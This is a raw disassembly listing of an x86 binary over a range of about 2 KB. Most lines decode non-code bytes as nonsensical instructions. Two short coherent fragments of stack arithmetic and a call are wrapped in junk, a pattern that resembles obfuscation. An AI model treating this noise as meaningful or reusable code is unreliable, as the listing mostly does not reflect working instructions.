  419b77:	xor    dh,BYTE PTR [ebx+0x302df57c]
  419b7d:	add    esi,DWORD PTR [edx]
  419b7f:	jbe    0x419ba1
  419b81:	pop    ss
  419b82:	test   DWORD PTR [esi-0x23bdb395],eax
  419b88:	add    DWORD PTR [esi+edi*2-0x333f4e3a],edi
  419b8f:	lock mov eax,0xee329641
  419b95:	or     eax,0x18cbb5ec
  419b9a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  419b9c:	or     cl,BYTE PTR [ecx+0x3b]
  419b9f:	(bad)  
  419ba1:	(bad)  
  419ba2:	push   ss
  419ba3:	rcl    BYTE PTR [ecx-0x30],cl
  419ba6:	and    dl,0xfb
  419ba9:	push   edi
  419baa:	cmc    
  419bab:	sbb    eax,0xbf477eb7
  419bb0:	or     eax,0x9da80014
  419bb5:	sub    BYTE PTR [eax+0x66],ch
  419bb8:	inc    ecx
  419bb9:	push   ds
  419bba:	mov    bh,bh
  419bbc:	inc    ebx
  419bbd:	xchg   esp,eax
  419bbe:	jg     0x419bf2
  419bc0:	cmc    
  419bc1:	fild   WORD PTR [eax-0x48906677]
  419bc7:	cmp    eax,0x37fbbce2
  419bcc:	mov    ebx,0x9627ed49
  419bd1:	and    eax,0xaf1d767e
  419bd6:	jae    0x419c39
  419bd8:	xchg   ecx,eax
  419bd9:	sub    DWORD PTR [eax+0x45f8e3f4],ebp
  419bdf:	dec    esp
  419be0:	adc    eax,0x4c8d55ff
  419be5:	push   ecx
  419be6:	sub    dh,BYTE PTR [edx]
  419be8:	mov    WORD PTR [esi+ebp*4+0x0],es
  419bec:	jg     0x419b99
  419bee:	inc    ecx
  419bef:	mov    edx,0x7670bed
  419bf4:	fsub   DWORD PTR [ecx]
  419bf6:	scas   al,BYTE PTR es:[edi]
  419bf7:	in     al,0x6e
  419bf9:	mov    ecx,0x4fbd60a9
  419bfe:	push   0x40
  419c00:	mov    eax,ds:0x3dca0e4f
  419c05:	and    al,BYTE PTR [ecx]
  419c07:	(bad)  
  419c08:	pop    ebx
  419c09:	aad    0x81
  419c0b:	in     al,dx
  419c0c:	jbe    0x419bb3
  419c0e:	(bad)  [esi]
  419c10:	xor    ah,ah
  419c12:	(bad)  
  419c13:	in     al,0x8c
  419c15:	cmp    eax,0x2a0628eb
  419c1a:	mov    cl,0xfd
  419c1c:	mov    eax,es
  419c1e:	(bad)  
  419c1f:	cld    
  419c20:	inc    ebp
  419c21:	or     BYTE PTR [edx-0x4c],ah
  419c24:	pop    ebp
  419c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c26:	mov    al,ds:0x86b0688e
  419c2b:	add    BYTE PTR [esi-0x14ef0408],bh
  419c31:	jmp    eax
  419c33:	pop    es
  419c34:	scas   eax,DWORD PTR es:[edi]
  419c35:	in     eax,0x88
  419c37:	dec    esp
  419c38:	cmc    
  419c39:	and    al,0x73
  419c3b:	fistp  QWORD PTR [esi]
  419c3d:	xor    cl,dl
  419c3f:	cdq    
  419c40:	jns    0x419bf0
  419c42:	mov    ds:0xab992651,eax
  419c47:	call   0x6b4c:0x7a1ff2f0
  419c4e:	(bad)
  419c52:	(bad)  
  419c53:	out    0xec,al
  419c55:	pop    ss
  419c56:	leave  
  419c57:	pop    ss
  419c58:	retf   
  419c59:	jbe    0x419c45
  419c5b:	stc    
  419c5c:	sub    BYTE PTR [ebx],0xc7
  419c5f:	out    dx,eax
  419c60:	xchg   ebp,eax
  419c61:	shl    BYTE PTR [ebx-0x79],0xc0
  419c65:	aaa    
  419c66:	or     ebp,DWORD PTR [edx]
  419c68:	fisttp QWORD PTR ds:0xf144f0c5
  419c6e:	dec    ebx
  419c6f:	push   ebx
  419c70:	xchg   ecx,eax
  419c71:	xchg   ebx,eax
  419c72:	popf   
  419c73:	pusha  
  419c74:	sub    al,0x97
  419c76:	pushf  
  419c77:	pusha  
  419c78:	xchg   ebp,eax
  419c79:	sbb    ch,BYTE PTR [edi-0x628b9033]
  419c7f:	cwde   
  419c80:	(bad)  
  419c81:	loope  0x419cfc
  419c83:	xor    bl,BYTE PTR [edx+0x45]
  419c86:	fisttp QWORD PTR [ebx+0x434966e9]
  419c8c:	scas   al,BYTE PTR es:[edi]
  419c8d:	cld    
  419c8e:	daa    
  419c8f:	jmp    0xc47b17f8
  419c94:	or     al,0xf5
  419c96:	nop
  419c97:	sub    eax,DWORD PTR [esi+0x7780c685]
  419c9d:	mov    ch,0x4b
  419c9f:	and    DWORD PTR [esp+ecx*2],0xa461d3b2
  419ca6:	cmp    eax,0x92e3f7da
  419cab:	test   eax,0xdbca369b
  419cb0:	jg     0x419d1e
  419cb2:	inc    edi
  419cb3:	cmp    BYTE PTR [ebx+0x199636f],bl
  419cb9:	push   eax
  419cba:	ss sbb al,bl
  419cbd:	and    edi,DWORD PTR [esi]
  419cbf:	rcl    cl,1
  419cc1:	jecxz  0x419c96
  419cc3:	jle    0x419c68
  419cc5:	(bad)  
  419cc6:	hlt    
  419cc7:	fisttp WORD PTR [ebx]
  419cc9:	or     al,0xa5
  419ccb:	lea    eax,[edi]
  419ccd:	data16 in al,0xc
  419cd0:	hlt    
  419cd1:	jbe    0x419c5a
  419cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd4:	and    DWORD PTR [ecx-0x496ed031],ebx
  419cda:	cmp    eax,0xc43394cd
  419cdf:	outs   dx,BYTE PTR ds:[esi]
  419ce0:	neg    ecx
  419ce2:	adc    al,0xf4
  419ce5:	mov    cl,0xf2
  419ce7:	jmp    0x419d24
  419ce9:	and    BYTE PTR [edi+0x7f],al
  419cec:	loop   0x419d57
  419cee:	xchg   edx,eax
  419cef:	push   eax
  419cf0:	mov    ch,ah
  419cf2:	dec    esp
  419cf3:	mov    WORD PTR [ebx+0xd2dac20],ds
  419cf9:	and    dh,BYTE PTR [ebp+0x18]
  419cfc:	adc    eax,0x5452e4da
  419d01:	sahf   
  419d02:	cwde   
  419d03:	fs xor al,0x48
  419d06:	sbb    cl,ch
  419d08:	add    BYTE PTR [ecx],ch
  419d0a:	int3   
  419d0b:	clc    
  419d0c:	jns    0x419ca7
  419d0e:	sbb    al,0xab
  419d10:	adc    DWORD PTR [ecx-0x2f],ecx
  419d13:	mov    dl,0xd9
  419d15:	fs mov edi,0x38984652
  419d1b:	xor    BYTE PTR [esi],0x39
  419d1e:	push   ebx
  419d1f:	xchg   ebp,eax
  419d20:	ret    0x83d9
  419d23:	pop    eax
  419d24:	and    ebp,ecx
  419d26:	mov    esi,0x80ba78e1
  419d2b:	stos   BYTE PTR es:[edi],al
  419d2c:	xor    eax,esi
  419d2e:	sub    ebx,DWORD PTR [edi-0x1b3a2cd5]
  419d34:	mov    eax,0xb714f5a0
  419d39:	push   edi
  419d3a:	pop    ebp
  419d3b:	aam    0xa
  419d3d:	mov    esp,DWORD PTR [edx]
  419d3f:	adc    ecx,DWORD PTR [eax]
  419d41:	pop    ebx
  419d42:	xor    ecx,esi
  419d44:	aad    0x2e
  419d46:	cmc    
  419d47:	ror    DWORD PTR [esi],1
  419d49:	(bad)  [edi+0x17]
  419d4c:	popa   
  419d4d:	mov    DWORD PTR [edi+0xf],ebx
  419d50:	or     ebx,ecx
  419d52:	cmp    dh,BYTE PTR [eax]
  419d54:	adc    BYTE PTR [ebp-0x1c],ch
  419d57:	jns    0x419d85
  419d59:	lds    edi,FWORD PTR [ebx+edi*8-0x4c7599e3]
  419d60:	rcl    BYTE PTR [eax+0x34],cl
  419d63:	shl    DWORD PTR [ebx+edi*8],0x76
  419d67:	dec    esp
  419d68:	xchg   ebx,eax
  419d69:	add    ebp,esp
  419d6b:	ffreep st(6)
  419d6d:	or     ah,0x46
  419d70:	mov    edx,0xd3b10503
  419d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d76:	dec    edi
  419d77:	lods   al,BYTE PTR ds:[esi]
  419d78:	xchg   esp,eax
  419d79:	clc    
  419d7a:	or     eax,DWORD PTR [edi+esi*1-0x4a27181d]
  419d81:	mov    ds:0xbd13928a,eax
  419d86:	adc    DWORD PTR [esi-0xc],0x8a5c277e
  419d8d:	push   esp
  419d8e:	fucomip st,st(2)
  419d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d91:	mov    dl,BYTE PTR [ecx]
  419d93:	xchg   edi,eax
  419d94:	ret    
  419d95:	out    dx,eax
  419d96:	sbb    al,0x13
  419d98:	dec    bp
  419d9a:	add    eax,0x7ff6225e
  419d9f:	pushf  
  419da0:	jp     0x419dc4
  419da2:	mov    ds:0xe6972540,eax
  419da7:	loope  0x419df6
  419da9:	mov    dh,0x23
  419dab:	mov    bh,0x71
  419dad:	rcl    ch,0xcb
  419db0:	arpl   WORD PTR [ebp-0x5e],di
  419db3:	or     al,0xf3
  419db5:	cmc    
  419db6:	retf   0x8f54
  419db9:	cmp    ecx,esi
  419dbb:	sbb    ecx,ebx
  419dbd:	xor    eax,0xf688ba84
  419dc2:	inc    eax
  419dc3:	into   
  419dc4:	adc    ebx,edi
  419dc6:	push   0x2d
  419dc8:	stc    
  419dc9:	cs mov cs,edx
  419dcc:	add    BYTE PTR [ebx+eax*2+0x2d],bl
  419dd0:	leave  
  419dd1:	js     0x419e4d
  419dd3:	ins    DWORD PTR es:[edi],dx
  419dd4:	imul   ebx,DWORD PTR [ebx-0x3f154227],0xffffff9c
  419ddb:	aad    0x96
  419ddd:	and    al,0x8e
  419ddf:	popf   
  419de0:	ror    bl,1
  419de2:	mov    bl,0xbc
  419de4:	mov    ?,WORD PTR ds:0xd60868bd
  419dea:	inc    eax
  419deb:	adc    eax,0x7a2932b0
  419df0:	push   cs
  419df1:	lods   al,BYTE PTR ds:[esi]
  419df2:	mov    ebx,cs
  419df4:	xchg   edi,eax
  419df5:	mov    esp,0x55dc87b2
  419dfa:	cmp    DWORD PTR [edx],ebp
  419dfc:	jle    0x419dce
  419dfe:	out    dx,al
  419dff:	cmp    eax,ebx
  419e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e02:	mov    ch,0xe7
  419e04:	push   ecx
  419e05:	sub    ah,BYTE PTR [ecx+0x49eb4450]
  419e0b:	adc    al,0x17
  419e0d:	mov    ebp,DWORD PTR [ecx+0x31a52d0c]
  419e13:	scas   al,BYTE PTR es:[edi]
  419e14:	mov    ds:0x3ed5e57d,al
  419e19:	push   0xffffff8b
  419e1b:	and    edi,ebp
  419e1d:	sbb    eax,0x26374a11
  419e22:	push   ss
  419e23:	jns    0x419e48
  419e25:	mov    BYTE PTR [edi],bl
  419e27:	xlat   BYTE PTR ds:[ebx]
  419e28:	mov    esi,0xe3ef537a
  419e2d:	and    ebx,esi
  419e2f:	popa   
  419e30:	aas    
  419e31:	jne    0x419e6a
  419e33:	iret   
  419e34:	les    esp,FWORD PTR [edi-0x75]
  419e37:	dec    esp
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x7c85e82d
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	das    
  419e6f:	sbb    al,cl
  419e71:	fiadd  WORD PTR [edi]
  419e73:	inc    esp
  419e74:	and    dl,dh
  419e76:	call   0x7396:0xfc8c96d8
  419e7d:	or     BYTE PTR [edx],dh
  419e7f:	sub    BYTE PTR [edi],bh
  419e81:	sahf   
  419e82:	sbb    dh,BYTE PTR [edx+0x2fadf118]
  419e88:	jae    0x419ead
  419e8a:	or     al,0x4f
  419e8c:	in     al,dx
  419e8d:	or     eax,0x8076e017
  419e92:	inc    esi
  419e93:	sahf   
  419e94:	sub    eax,0xdc183066
  419e99:	xchg   edx,eax
  419e9a:	sbb    al,0xdc
  419e9c:	and    ebp,DWORD PTR [ebx+0x2386f225]
  419ea2:	sub    ebx,ebx
  419ea4:	(bad)  
  419ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ea6:	popa   
  419ea7:	les    ebp,FWORD PTR ds:0x55aa490b
  419ead:	push   ebp
  419eae:	ja     0x419e6a
  419eb0:	xor    eax,esp
  419eb2:	addr16 jmp 0xae75:0x8434f404
  419eba:	dec    eax
  419ebb:	sbb    al,0x3
  419ebd:	and    DWORD PTR [esi],ebx
  419ebf:	xor    ch,BYTE PTR [eax+0x67adcf0a]
  419ec5:	in     al,0xb2
  419ec7:	cwd    
  419ec9:	repz in al,0x7a
  419ecc:	addr16 in al,0xfc
  419ecf:	mov    dl,bl
  419ed1:	mov    ah,0xf0
  419ed3:	popa   
  419ed4:	lods   al,BYTE PTR ds:[si]
  419ed6:	push   edi
  419ed7:	ja     0x419f14
  419ed9:	jmp    0xfde89ca4
  419ede:	outs   dx,DWORD PTR ds:[esi]
  419edf:	test   eax,0x821e0848
  419ee4:	sub    al,0x1d
  419ee6:	sbb    BYTE PTR [ecx-0x3e],bh
  419ee9:	daa    
  419eea:	pop    ebx
  419eeb:	mov    ch,0x80
  419eed:	mov    ds:0x630f347b,eax
  419ef2:	xchg   BYTE PTR [ebp-0x658a8694],al
  419ef8:	call   0xa38d3b48
  419efd:	cli    
  419efe:	push   esp
  419eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f00:	fnsave [edi+0x29]
  419f03:	mov    cl,0x9e
  419f05:	sub    DWORD PTR [ecx],ebp
  419f07:	jno    0x419f1d
  419f09:	xor    BYTE PTR [edi-0x43],dh
  419f0c:	in     eax,0xf
  419f0e:	adc    al,0xd0
  419f10:	ins    BYTE PTR es:[edi],dx
  419f11:	xchg   esp,eax
  419f12:	sub    edx,esi
  419f14:	dec    ebp
  419f15:	mov    BYTE PTR es:[edi],ch
  419f18:	sahf   
  419f19:	xchg   ebx,eax
  419f1a:	and    dl,ch
  419f1c:	add    bl,BYTE PTR [ecx+0x8]
  419f1f:	out    0x5d,eax
  419f21:	sub    DWORD PTR [edi-0x7b],ecx
  419f24:	dec    ebp
  419f25:	loope  0x419ee0
  419f27:	lea    ebp,ds:0x23df5eab
  419f2d:	xor    bl,cl
  419f2f:	and    BYTE PTR [edx-0x4cd1e749],bl
  419f35:	sahf   
  419f36:	sub    edx,DWORD PTR ds:0x1f84c430
  419f3c:	(bad)  
  419f3d:	sub    ebx,edx
  419f3f:	sub    edi,ebp
  419f41:	cmc    
  419f42:	jp     0x419f78
  419f44:	jno    0x419eea
  419f46:	xor    BYTE PTR [ebp-0x4b71c897],al
  419f4c:	cs pop edx
  419f4e:	(bad)  
  419f4f:	retf   
  419f50:	sti    
  419f51:	(bad)  
  419f53:	jns    0x419f7a
  419f55:	mov    al,ds:0x7671d3de
  419f5a:	push   ss
  419f5b:	pop    edx
  419f5c:	in     al,dx
  419f5d:	retf   
  419f5e:	sti    
  419f5f:	push   eax
  419f60:	push   cs
  419f61:	lods   eax,DWORD PTR ds:[esi]
  419f62:	test   BYTE PTR [edi+0x79],dl
  419f65:	shl    ebp,0xbf
  419f68:	xor    ah,BYTE PTR [ebx+0x6]
  419f6b:	pop    ebx
  419f6c:	(bad)  
  419f6d:	pop    esi
  419f6e:	rol    DWORD PTR [eax+edx*8+0x7e],cl
  419f72:	mov    edi,0x2e2eef8c
  419f77:	push   ebx
  419f78:	adc    eax,0x1154869e
  419f7d:	dec    esp
  419f7e:	inc    esi
  419f7f:	cli    
  419f80:	jnp    0x419fc0
  419f82:	mul    BYTE PTR [ebx]
  419f84:	int    0x90
  419f86:	xor    DWORD PTR [ebx+ebx*8-0x5a],edi
  419f8a:	mov    dl,0xbc
  419f8c:	lea    eax,[ebx-0x3ba3d2cd]
  419f92:	mov    cl,0xe
  419f94:	div    dh
  419f96:	div    BYTE PTR [edx+0x6f]
  419f99:	sbb    BYTE PTR [edx-0x4cd86eb0],0xef
  419fa0:	ficom  DWORD PTR [esi+0x2d622426]
  419fa6:	fnstcw WORD PTR [edx+eiz*4+0x31]
  419faa:	push   ebx
  419fab:	mov    ebx,0x6c58111c
  419fb0:	fs in  al,0x9e
  419fb3:	ss leave 
  419fb5:	cwde   
  419fb6:	mov    BYTE PTR [ecx],dh
  419fb8:	mov    esi,0x260b7c38
  419fbd:	jl     0x419f69
  419fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc0:	push   ebp
  419fc1:	popf   
  419fc2:	je     0x419fe0
  419fc4:	pop    ecx
  419fc5:	push   cs
  419fc6:	push   edi
  419fc7:	(bad)  
  419fc9:	fcomp  QWORD PTR [edx-0x24]
  419fcc:	and    DWORD PTR [eax],esp
  419fce:	inc    ecx
  419fcf:	mov    edx,0xfedf633e
  419fd4:	inc    ebx
  419fd5:	clc    
  419fd6:	test   DWORD PTR [edi+0x78],edi
  419fd9:	inc    edi
  419fda:	adc    al,0x98
  419fdc:	sahf   
  419fdd:	jns    0x419fec
  419fdf:	sub    BYTE PTR [eax+0x4c],bl
  419fe2:	in     al,0x1d
  419fe4:	pop    edx
  419fe5:	adc    eax,0x2f98a781
  419fea:	push   es
  419feb:	test   BYTE PTR [ebp-0x5b],0x8f
  419fef:	jp     0x419fdd
  419ff1:	xor    DWORD PTR [ecx-0x2b4f0603],ebp
  419ff7:	in     al,dx
  419ff8:	iret   
  419ff9:	fldcw  WORD PTR [ebx-0x632f8ab]
  419fff:	adc    esp,eax
  41a001:	inc    ebx
  41a002:	sbb    ecx,ecx
  41a004:	and    BYTE PTR [ecx],dl
  41a006:	sbb    esp,DWORD PTR [ecx]
  41a008:	rcl    BYTE PTR [edi+0x60],1
  41a00b:	xchg   edi,eax
  41a00c:	(bad)  
  41a00e:	add    al,0xdf
  41a010:	in     al,0xd8
  41a012:	outs   dx,BYTE PTR ds:[esi]
  41a013:	sahf   
  41a014:	add    DWORD PTR [eax-0x7f],edx
  41a017:	out    0xb4,eax
  41a019:	iret   
  41a01a:	mov    al,ds:0x112abbaf
  41a01f:	dec    ebx
  41a020:	or     al,0x1
  41a022:	dec    eax
  41a023:	sbb    eax,0x78d6a39d
  41a028:	cdq    
  41a029:	sub    BYTE PTR [eax-0x726d698d],ah
  41a02f:	adc    eax,0x55707677
  41a034:	mov    edi,0xebb892b8
  41a039:	mov    ds:0x429ddf36,al
  41a03e:	cdq    
  41a03f:	scas   al,BYTE PTR es:[edi]
  41a040:	lahf   
  41a041:	pop    es
  41a042:	dec    esp
  41a043:	lock jae 0x41a081
  41a046:	xor    BYTE PTR [ebp+0x42d728ad],0x2
  41a04d:	cs adc esp,0x7bb79863
  41a054:	imul   ecx,DWORD PTR [edi+0x68],0x2318561b
  41a05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a05c:	xor    BYTE PTR [edx],dh
  41a05e:	(bad)  [esi]
  41a060:	cmp    al,0x4f
  41a062:	daa    
  41a063:	lahf   
  41a064:	xchg   dl,dh
  41a066:	sbb    bh,BYTE PTR [edx-0x37]
  41a069:	or     eax,0x4dd562e9
  41a06e:	inc    esi
  41a06f:	inc    eax
  41a070:	(bad)  
  41a071:	mov    DWORD PTR ds:0x56870e7b,0x9f35a0d
  41a07b:	scas   eax,DWORD PTR es:[edi]
  41a07c:	push   0xd657e899
  41a081:	mov    DWORD PTR [edi],edi
  41a083:	in     al,0xc5
  41a085:	and    al,0x53
  41a087:	in     eax,0xb3
  41a089:	ror    BYTE PTR [esi+edi*4+0x25],1
  41a08d:	cwde   
  41a08e:	fdivr  QWORD PTR [ebx+0x22866ef]
  41a094:	not    esi
  41a096:	cwde   
  41a097:	ror    ecx,cl
  41a099:	mov    eax,ds:0xe2f85bea
  41a09e:	xchg   edi,eax
  41a09f:	ficomp WORD PTR [esi+0x5cb4d08d]
  41a0a5:	jp     0x41a0b8
  41a0a7:	pop    eax
  41a0a8:	jp     0x41a121
  41a0aa:	xlat   BYTE PTR ds:[ebx]
  41a0ab:	fist   WORD PTR [edx-0x4dcf7d36]
  41a0b1:	jbe    0x41a037
  41a0b3:	fist   WORD PTR [ecx*8+0x694a76f6]
  41a0ba:	mov    eax,0xe88c39f7
  41a0bf:	cld    
  41a0c0:	sub    dl,0xfb
  41a0c3:	jmp    FWORD PTR [edx]
  41a0c5:	sub    dl,BYTE PTR ds:[ebp-0x26546edd]
  41a0cc:	jno    0x41a11b
  41a0ce:	scas   al,BYTE PTR es:[edi]
  41a0cf:	adc    BYTE PTR [esi+ebx*2],bl
  41a0d2:	cwde   
  41a0d3:	mov    edx,0x79565021
  41a0d8:	sbb    BYTE PTR [esi+0x71],ch
  41a0db:	sbb    BYTE PTR [ecx-0x3d],dh
  41a0de:	(bad)  
  41a0df:	push   ebx
  41a0e0:	inc    esi
  41a0e1:	inc    ebp
  41a0e2:	or     al,0x99
  41a0e4:	int3   
  41a0e5:	aad    0x69
  41a0e7:	aaa    
  41a0e8:	loop   0x41a0a5
  41a0ea:	ds sub al,0x7d
  41a0ed:	jmp    FWORD PTR [ebx+0x7efc0448]
  41a0f3:	push   ebp
  41a0f4:	fs cmp eax,0xc71f994d
  41a0fa:	adc    al,BYTE PTR [edx-0x44]
  41a0fd:	ins    DWORD PTR es:[edi],dx
  41a0fe:	or     ch,dh
  41a100:	test   DWORD PTR [ecx+ebp*8-0x507db4b],eax
  41a107:	ss jmp 0x41a0eb
  41a10a:	xor    BYTE PTR [edx+0x5d39da99],ah
  41a110:	cmp    DWORD PTR [ebx-0x61],edi
  41a113:	mov    dl,0x53
  41a115:	xchg   esi,eax
  41a116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a117:	and    al,0x26
  41a119:	nop
  41a11a:	popf   
  41a11b:	and    bh,0xd4
  41a11e:	cmp    al,0x66
  41a120:	(bad)  
  41a122:	or     edi,DWORD PTR [ebx]
  41a124:	lahf   
  41a125:	pop    edi
  41a126:	add    ebx,DWORD PTR gs:[esp+ebp*8+0x7f]
  41a12b:	add    ebp,ebp
  41a12d:	outs   dx,BYTE PTR ds:[esi]
  41a12e:	jae    0x41a12d
  41a130:	dec    edx
  41a131:	arpl   dx,ax
  41a133:	dec    eax
  41a134:	fld    QWORD PTR [edx+ebx*4-0x5d]
  41a138:	fistp  DWORD PTR [edi-0x535c8937]
  41a13e:	mov    dh,0x64
  41a140:	pop    ds
  41a141:	add    DWORD PTR [ecx+0x8],ebx
  41a144:	lock pop esp
  41a146:	repz sbb eax,0xc8bfca03
  41a14c:	pusha  
  41a14d:	ficom  WORD PTR [ebp+0x48]
  41a150:	lds    esi,FWORD PTR [edx-0x256bb8d7]
  41a156:	rcl    eax,cl
  41a158:	mov    gs:0xe05ffe7d,al
  41a15e:	sbb    ebp,esi
  41a160:	or     al,0x93
  41a162:	dec    esi
  41a163:	dec    eax
  41a164:	jns    0x41a142
  41a166:	inc    ebp
  41a167:	aaa    
  41a168:	scas   al,BYTE PTR es:[edi]
  41a169:	sub    bl,BYTE PTR [ebp+0x720d94b7]
  41a16f:	push   ebx
  41a170:	retf   0x1c6f
  41a173:	cli    
  41a174:	jae    0x41a1b6
  41a176:	scas   al,BYTE PTR es:[edi]
  41a177:	out    0x4e,al
  41a179:	into   
  41a17a:	add    DWORD PTR [ebx],esp
  41a17c:	pushf  
  41a17d:	(bad)  
  41a17f:	inc    eax
  41a180:	in     al,0xca
  41a182:	loop   0x41a1f8
  41a184:	inc    DWORD PTR [edi-0x53]
  41a187:	dec    ecx
  41a188:	push   edi
  41a189:	adc    BYTE PTR [edx],bl
  41a18b:	sub    eax,0xf703194b
  41a190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a191:	ins    BYTE PTR es:[edi],dx
  41a192:	mov    al,ds:0x3eb02897
  41a197:	fwait
  41a198:	and    ecx,edi
  41a19a:	lds    ebp,FWORD PTR [ebp-0x56d0d5df]
  41a1a0:	mov    esp,0x61a860af
  41a1a5:	int    0xf3
  41a1a7:	pop    ebp
  41a1a8:	sub    bl,0x5a
  41a1ab:	add    eax,0x7eef1199
  41a1b0:	add    BYTE PTR [eax+0x724937f9],ch
  41a1b6:	or     ebx,DWORD PTR [edi+0x6dd42029]
  41a1bc:	jo     0x41a150
  41a1be:	popa   
  41a1bf:	pop    edi
  41a1c0:	arpl   WORD PTR [eax+eiz*2-0x54d1346b],bx
  41a1c7:	sub    edx,edx
  41a1c9:	sbb    DWORD PTR [esi+0x59e98f8b],ebp
  41a1cf:	mov    ds:0x6ca321ab,al
  41a1d4:	outs   dx,BYTE PTR ds:[esi]
  41a1d5:	pop    es
  41a1d6:	outs   dx,DWORD PTR ds:[esi]
  41a1d7:	das    
  41a1d8:	pop    ebx
  41a1d9:	inc    esp
  41a1da:	and    DWORD PTR [ebx],esp
  41a1dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1dd:	mov    esi,0x4be47294
  41a1e2:	pop    ebp
  41a1e3:	push   ss
  41a1e4:	ja     0x41a16d
  41a1e6:	icebp  
  41a1e7:	cmp    DWORD PTR [ebp+0x2e],edx
  41a1ea:	pop    edx
  41a1eb:	mov    edi,0x578cac77
  41a1f0:	jge    0x41a26a
  41a1f2:	pop    ebp
  41a1f3:	imul   esp,edi,0xffffff98
  41a1f6:	dec    eax
  41a1f7:	sub    bl,BYTE PTR [eax-0x19b0d38e]
  41a1fd:	inc    ecx
  41a1fe:	cmp    cl,ch
  41a200:	jmp    0x4504:0x3ba0260f
  41a207:	jnp    0x41a1eb
  41a209:	inc    esi
  41a20a:	pop    esp
  41a20b:	push   ss
  41a20c:	cmp    edx,edx
  41a20e:	add    al,0x73
  41a210:	sub    eax,0xeab50772
  41a215:	push   esi
  41a216:	jmp    DWORD PTR [ecx]
  41a218:	(bad)  
  41a219:	stos   DWORD PTR es:[edi],eax
  41a21a:	call   0xcefeb228
  41a21f:	cdq    
  41a220:	and    eax,0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	xchg   ebx,eax
  41a2a1:	call   0xad6d1373
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1+0x1ad61818],bh
  41a2ae:	loopne 0x41a2e0
  41a2b0:	xor    ch,0x26
  41a2b3:	jmp    0x41a25f
  41a2b5:	mov    BYTE PTR [esp+ecx*8+0xf],cl
  41a2b9:	inc    edx
  41a2ba:	popf   
  41a2bb:	mov    ch,0xc9
  41a2bd:	or     BYTE PTR [eax],dl
  41a2bf:	inc    edx
  41a2c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c1:	lahf   
  41a2c2:	loop   0x41a2a4
  41a2c4:	test   eax,0x7592d43e
  41a2c9:	mov    WORD PTR [esi+0x72b17446],?
  41a2cf:	data16 or dl,cl
  41a2d2:	inc    ebx
  41a2d3:	addr16 pop ss
  41a2d5:	dec    edi
  41a2d6:	add    cl,cl
  41a2d8:	and    DWORD PTR ds:0xee1b94de,ebp
  41a2de:	xor    esi,0x4c25c710
  41a2e4:	pop    esi
  41a2e5:	mov    eax,0x71a7a42a
  41a2ea:	out    dx,eax
  41a2eb:	sbb    DWORD PTR [eax+eiz*8],ecx
  41a2ee:	std    
  41a2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2f0:	jae    0x41a2aa
  41a2f2:	fs (bad) 
  41a2f4:	fst    DWORD PTR [eax-0x6635fe1a]
  41a2fa:	in     eax,0xa7
  41a2fc:	mov    eax,0x5aa2ded8
  41a301:	shl    dh,cl
  41a303:	jbe    0x41a2e5
  41a305:	fsubr  st,st(7)
  41a307:	mov    al,ds:0x2a4997cd
  41a30c:	xlat   BYTE PTR ds:[ebx]
  41a30d:	loop   0x41a2f7
  41a30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a310:	jmp    0x41a2a5
  41a312:	jle    0x41a34f
  41a314:	test   ecx,edx
  41a316:	mov    dh,0x64
  41a318:	cli    
  41a319:	imul   BYTE PTR [edx-0x57]
  41a31c:	sub    DWORD PTR [edi-0x8],ebx
  41a31f:	icebp  
  41a320:	in     al,dx
  41a321:	ins    DWORD PTR es:[edi],dx
  41a322:	mov    ebp,0xacaf4cbb
  41a327:	push   eax
  41a328:	inc    ebx
  41a329:	sahf   
  41a32a:	sbb    DWORD PTR [eax],ecx
  41a32c:	mov    DWORD PTR [ecx-0x405f7a53],ebx
  41a332:	js     0x41a2ca
